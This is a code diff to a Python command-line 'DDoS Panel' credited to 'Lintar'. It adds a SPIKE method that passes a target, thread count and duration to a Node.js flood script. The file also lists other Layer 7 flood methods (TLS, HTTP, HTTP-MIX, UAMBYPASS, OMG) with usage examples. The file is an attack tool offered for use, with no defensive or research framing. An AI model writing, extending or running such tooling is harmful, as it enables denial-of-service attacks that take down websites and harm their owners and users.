@@ -24,7 +24,7 @@ def lod():
 
 def atas():
 	print(' Its | Wellcome To Its DDoS Panel | Owner By: Lintar ')
-	print('             Botnets that we have : {bots}           ')
+	print('                      Botnets that we have : {bots}                      ')
 	print("")
 
 def logo():
@@ -44,9 +44,10 @@ def logo():
  """)
 	
 def methods():
+	clear()
 	print("""
-
 » Layer7: 
+	SPIKE <target> <threads> <time>
 	TLS <url> <time> <Rate> <threads>
 	HTTP <url> <req_per_ip> <time>
 	HTTP-MIX <url> <time>
@@ -70,9 +71,9 @@ def main():
     logo()
     while(True):
         cnc = input('''@Lintar\n ==>''')
-        if cnc == "method" or cnc == "methods" or cnc == "METHOD" or cnc == "METHODS":
+        if cnc == "Methods" or cnc == "methods" or cnc == "METHOD" or cnc == "METHODS":
             methods()
-        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
+        elif cnc == "Clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
             main()
 		
 # LAYER 7 METHODS
@@ -88,6 +89,16 @@ def main():
                 print('Usage: UAMBYPASS <url> <time> <ConnectPerThread> <proxies> <thread>')
                 print('Example: UAMBYPASS <http://example.com> <60> <250> <proxy.txt> <1>')
 
+        elif "SPIKE" in cnc:
+            try:
+                target = cnc.split()[1]
+                threads = cnc.split()[2]
+                time = cnc.split()[3]
+                os.system(f'node spike.js {target} {threads} {time}')
+            except IndexError:
+                print('Usage: SPIKE <target> <threads> <time>')
+                print('Example: SPIKE example.com 95500 120')
+                
         elif "OMG" in cnc:
             try:
                 url = cnc.split()[1]
